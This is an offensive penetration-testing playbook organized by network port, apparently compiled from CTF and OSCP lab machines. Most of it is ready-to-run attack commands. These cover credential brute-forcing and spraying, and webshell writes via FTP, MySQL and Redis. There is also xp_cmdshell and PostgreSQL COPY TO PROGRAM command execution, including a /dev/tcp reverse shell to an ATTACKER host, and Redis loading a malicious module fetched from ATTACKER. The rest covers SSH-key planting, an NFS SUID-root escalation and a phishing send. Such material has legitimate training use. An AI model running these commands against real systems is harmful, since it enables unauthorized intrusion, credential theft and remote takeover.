# Network & Port Attack Playbook — Husky Hacker

Based on real techniques from: Frostbite, New Hire, Haystack, exghost, trilocor, Sled, blocksynergy, OSCP Labs A–D, Medtech.

---

## Quick Reference — Port → First Move

| Port | Service | First Move |
|---|---|---|
| 21 | FTP | `ftp $TARGET` anonymous / `hydra -C ftp-betterdefaultpasslist.txt` |
| 22 | SSH | Banner grab / spray known creds / `ssh -i id_rsa user@$TARGET` |
| 25 | SMTP | `smtp-user-enum -M VRFY -U users.txt -t $TARGET` |
| 53 | DNS | `dig axfr $DOMAIN @$TARGET` |
| 80/443 | HTTP/S | `whatweb` → `gobuster` → see Web Attacks cheat sheet |
| 88 | Kerberos | AS-REP Roast / Kerberoast (see AD cheat sheet) |
| 110/143 | POP3/IMAP | Login with creds → read emails for intel |
| 111 | RPCbind | `rpcinfo -p $TARGET` → check NFS |
| 135 | MSRPC | `rpcclient -U '' -N $TARGET` |
| 139/445 | SMB | `smbclient -N -L //$TARGET/` → `enum4linux-ng -A $TARGET` |
| 161 | SNMP | `snmpwalk -v2c -c public $TARGET` |
| 389/636 | LDAP | `ldapsearch -x -H ldap://$TARGET -b '' -s base` |
| 1433 | MSSQL | `impacket-mssqlclient user:pass@$TARGET -windows-auth` |
| 1521 | Oracle | `odat all -s $TARGET` |
| 2049 | NFS | `showmount -e $TARGET` → mount |
| 3306 | MySQL | `mysql -h $TARGET -u root` |
| 3389 | RDP | `xfreerdp /v:$TARGET /u:user /p:pass +clipboard` |
| 5432 | PostgreSQL | `psql -h $TARGET -U postgres` |
| 5900 | VNC | `vncviewer $TARGET` |
| 5985 | WinRM | `evil-winrm -i $TARGET -u user -p pass` |
| 6379 | Redis | `redis-cli -h $TARGET` |
| 8080 | HTTP-Alt | Same as 80 — `whatweb` → `gobuster` |
| 9090 | Various | Check with curl — could be Prometheus, Cockpit, etc. |

---

## FTP (Port 21)

**Used on:** exghost (default creds → PCAP), Haystack (anonymous → app.zip), OSCP Lab C (anonymous)

```bash
# Anonymous login
ftp $TARGET
# user: anonymous  pass: anonymous (or blank)

# Default credential brute force (exghost pattern)
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  ftp://$TARGET

# Brute force specific user
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$TARGET

# Download everything
wget -r ftp://anonymous:anonymous@$TARGET/

# Check for writable (upload webshell if FTP root = web root)
ftp $TARGET
> put shell.php
> quit
curl http://$TARGET/shell.php?c=id
```

**What to grab:** .pcap files, .zip archives, config files, scripts, anything

---

## SSH (Port 22)

**Used on:** Haystack (password reuse), trilocor (key from LFI/NFS), multiple boxes

```bash
# Banner grab
ssh -o BatchMode=yes -o ConnectTimeout=5 nobody@$TARGET 2>&1 | head -1

# Login with password
ssh user@$TARGET

# Login with key
chmod 600 id_rsa
ssh -i id_rsa user@$TARGET

# Spray known credentials
crackmapexec ssh $TARGET -u users.txt -p 'found_password'
hydra -L users.txt -p 'Welcome1!' ssh://$TARGET

# User enum (old OpenSSH < 7.7 — CVE-2018-15473)
python3 ssh_user_enum.py $TARGET --wordlist users.txt

# Port forward through SSH
ssh -L 3306:127.0.0.1:3306 user@$TARGET     # local forward
ssh -D 1080 user@$TARGET                     # SOCKS proxy
ssh -R 4444:127.0.0.1:4444 user@$ATTACKER   # remote forward
```

---

## SMB (Port 139/445)

**Used on:** New Hire (guest → HR share), Greenfield (anonymous → Public share), Ridgeline (IT-Support share), multiple OSCP labs

```bash
# Null session
smbclient -N -L //$TARGET/
crackmapexec smb $TARGET -u '' -p '' --shares

# Guest session
smbclient -U 'guest%' -L //$TARGET/
crackmapexec smb $TARGET -u 'guest' -p '' --shares

# With credentials
smbclient -U 'user%password' //$TARGET/ShareName
crackmapexec smb $TARGET -u user -p 'pass' --shares

# List and access shares
smbclient //$TARGET/share_name -U 'user%pass'
> ls
> cd directory
> get file.txt
> mget *         # download everything

# Recursive download entire share
smbclient //$TARGET/share -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'

# Enum4linux
enum4linux-ng -A $TARGET
enum4linux-ng -u user -p pass -A $TARGET

# RPC null session (user enumeration)
rpcclient -U '' -N $TARGET
> enumdomusers
> enumdomgroups
> querygroupmem 0x200   # Domain Admins RID

# Mount share locally
mount -t cifs //$TARGET/share /mnt/share -o username=user,password=pass
```

**Key finds from boxes:**
- New Hire: HR share had `employees.eml` with temp password
- Greenfield: Public share had `Onboarding-Guide.txt` with default password
- Ridgeline: IT-Support share had `password-reset-log.txt` with svc_sql creds
- OSCP Lab D: MySQL `.ibd` files in share leaked credentials

---

## SNMP (Port 161/UDP)

**Used on:** OSCP Lab B (Kiero — creds in SNMP), OSCP Lab C (VestaCP creds)

```bash
# Walk with common community strings
snmpwalk -v2c -c public $TARGET
snmpwalk -v2c -c private $TARGET
snmpwalk -v2c -c community $TARGET

# System description
snmpwalk -v2c -c public $TARGET system

# User accounts (critical for spray lists)
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25

# Running processes (may leak creds in command lines)
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2

# Network interfaces
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.2.2.1.2

# TCP listening ports
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.6.13.1.3

# Full dump with snmp-check
snmp-check $TARGET

# Brute community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $TARGET
```

**Key finds:** OSCP labs had credentials leaked in SNMP extended walk — ALWAYS check extended OIDs

---

## MSSQL (Port 1433)

**Used on:** New Hire (IMPERSONATE SA → xp_cmdshell), OSCP Lab B (Kerberoast → MSSQL), Medtech

```bash
# Connect
impacket-mssqlclient 'DOMAIN/user:pass'@$TARGET -windows-auth
impacket-mssqlclient 'user:pass'@$TARGET

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# If not SA — check IMPERSONATE (New Hire pattern)
SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';
-- Now enable xp_cmdshell

# Reverse shell via xp_cmdshell
EXEC xp_cmdshell 'powershell -e <BASE64_REVSHELL>';

# Linked servers (lateral movement)
EXEC sp_linkedservers;
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

# Read files
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';
```

---

## MySQL (Port 3306)

**Used on:** trilocor (root creds from config), Sled (hash extraction), HSM Defense (MariaDB MD5 hashes)

```bash
# Connect
mysql -h $TARGET -u root
mysql -h $TARGET -u root -p 'password'

# From config file (after getting filesystem access)
grep -i "password\|pass\|pwd" /var/www/html/config.php

# Extract users and hashes
SELECT user, authentication_string FROM mysql.user;
SELECT * FROM users;

# Read local files (if FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

# Write webshell (if FILE privilege + web root known)
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Hash cracking
# MySQL 5.x hash format: *HASH
hashcat -m 300 mysql_hashes.txt rockyou.txt

# MD5 hashes from app tables (HSM Defense pattern)
hashcat -m 0 md5_hashes.txt rockyou.txt
```

---

## PostgreSQL (Port 5432)

```bash
# Connect
psql -h $TARGET -U postgres
psql -h $TARGET -U postgres -d database_name

# List databases
\l

# List tables
\dt

# Read files (if superuser)
COPY (SELECT '') TO PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';

# Read local file
CREATE TABLE readfile(content text);
COPY readfile FROM '/etc/passwd';
SELECT * FROM readfile;
```

---

## Redis (Port 6379)

**Used on:** Frostbite (no auth → module load RCE)

```bash
# Connect (often no auth)
redis-cli -h $TARGET

# Basic enum
INFO
CONFIG GET *
KEYS *
GET <key>

# Webshell write (if web root known)
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET payload '<?php system($_GET["c"]); ?>'
SAVE

# SSH key write (if .ssh writable)
# Generate key
ssh-keygen -t rsa -f redis_key
# Pad with newlines
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
cat key.txt | redis-cli -h $TARGET -x SET sshkey
redis-cli -h $TARGET CONFIG SET dir /home/redis/.ssh
redis-cli -h $TARGET CONFIG SET dbfilename authorized_keys
redis-cli -h $TARGET SAVE
ssh -i redis_key redis@$TARGET

# Module load RCE (Frostbite pattern)
# Upload a malicious .so module
wget http://ATTACKER/module.so -O /tmp/module.so
redis-cli -h $TARGET MODULE LOAD /tmp/module.so
redis-cli -h $TARGET system.rev ATTACKER 4444

# If Redis runs as root service with sudo (Frostbite privesc)
# Create evil config that loads the module on a different port
echo "loadmodule /tmp/module.so" > /tmp/evil.conf
echo "port 6380" >> /tmp/evil.conf
sudo /usr/bin/redis-server /tmp/evil.conf
redis-cli -h 127.0.0.1 -p 6380 system.rev ATTACKER 4444
```

---

## NFS (Port 2049)

**Used on:** trilocor (mount → steal SSH keys), Medtech

```bash
# Show exports
showmount -e $TARGET

# Mount
mkdir /tmp/nfs
mount -t nfs $TARGET:/export/path /tmp/nfs

# Check for no_root_squash (privesc)
cat /etc/exports   # on target if you have shell

# no_root_squash exploit
# As root on attacker:
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# On target:
/export/path/bash -p   # root

# Key files to look for
find /tmp/nfs -name "id_rsa" -o -name "*.conf" -o -name "*.txt" | head -20
grep -r "password\|pass\|secret" /tmp/nfs/ 2>/dev/null
```

---

## LDAP (Port 389/636)

**Used on:** infinite_void (all AD boxes), OSCP labs

```bash
# Anonymous bind check
ldapsearch -x -H ldap://$TARGET -b '' -s base namingContexts

# Full anonymous dump
ldapsearch -x -H ldap://$TARGET -b 'DC=corp,DC=local'

# Authenticated dump
ldapsearch -x -H ldap://$TARGET -D 'user@corp.local' -w 'password' -b 'DC=corp,DC=local'

# Find users
ldapsearch -x -H ldap://$TARGET -b 'DC=corp,DC=local' '(objectClass=user)' samAccountName description

# Or just use infinite_void
python3 infinite_void.py -d corp.local -u user -p 'pass' -dc $TARGET
```

---

## SMTP (Port 25)

**Used on:** Aftermath (VRFY user enum)

```bash
# User enumeration via VRFY
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $TARGET

# Manual
telnet $TARGET 25
> VRFY admin
> VRFY root
> VRFY maria

# Send phishing email (HSM Defense pattern — ODT credential harvesting)
swaks --to target@domain.local --from attacker@domain.local \
  --server $TARGET --header "Subject: Important" \
  --attach malicious.odt
```

---

## DNS (Port 53)

**Used on:** trilocor (AXFR leaked subdomains/vhosts)

```bash
# Zone transfer (always try this!)
dig axfr $DOMAIN @$TARGET

# Reverse lookup
dig -x $TARGET @$TARGET

# Any records
dig any $DOMAIN @$TARGET

# Subdomain brute force
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $TARGET:53
```

---

## Internal Services (Post-Foothold)

**Found on every box — always check `ss -tlnp` after landing:**

```bash
# List listening services
ss -tlnp
netstat -tlnp

# Common internal services to target
127.0.0.1:3306    # MySQL → read configs, extract hashes
127.0.0.1:5432    # PostgreSQL → COPY TO PROGRAM RCE
127.0.0.1:6379    # Redis → webshell/SSH key/module load
127.0.0.1:8080    # Internal web app → browse via SSH tunnel
127.0.0.1:3000    # Gitea/Grafana/dev app → default creds
127.0.0.1:27017   # MongoDB → no auth common
127.0.0.1:9200    # Elasticsearch → unauthenticated query

# Port forward to access from attacker
ssh -L 3306:127.0.0.1:3306 user@$TARGET
# Then: mysql -h 127.0.0.1 -u root
```

---

*"Check every port. Read every config. Spray every cred." — Husky Hacker*
